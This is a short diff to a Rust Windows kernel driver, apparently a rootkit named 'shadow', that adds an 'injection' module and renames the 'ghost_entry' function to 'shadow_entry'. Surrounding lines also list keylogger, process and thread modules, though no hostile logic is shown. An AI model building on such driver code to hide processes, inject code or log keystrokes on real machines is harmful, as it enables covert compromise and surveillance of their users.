@@ -30,6 +30,7 @@ mod keylogger;
 mod process;
 mod thread;
 mod module;
+mod injection;
 mod utils;
 
 /// The name of the device in the device namespace.
@@ -64,14 +65,14 @@ pub unsafe extern "system" fn driver_entry(
 
         const DRIVER_NAME: &str = "\\Driver\\shadow";
         let mut driver_name = uni::str_to_unicode(DRIVER_NAME).to_unicode();
-        let status = IoCreateDriver(&mut driver_name, Some(ghost_entry));
+        let status = IoCreateDriver(&mut driver_name, Some(shadow_entry));
         if !NT_SUCCESS(status) {
             log::error!("IoCreateDriver Failed With Status: {status}");
         }
         return status;
     }
 
-    ghost_entry(driver, registry_path)
+    shadow_entry(driver, registry_path)
 }
 
 /// Driver input function.
@@ -86,7 +87,7 @@ pub unsafe extern "system" fn driver_entry(
 /// # Return
 /// - `NTSTATUS`: Status code indicating the success or failure of the operation.
 /// 
-pub unsafe extern "system" fn ghost_entry(
+pub unsafe extern "system" fn shadow_entry(
     driver: &mut DRIVER_OBJECT,
     _registry_path: PCUNICODE_STRING,
 ) -> NTSTATUS {
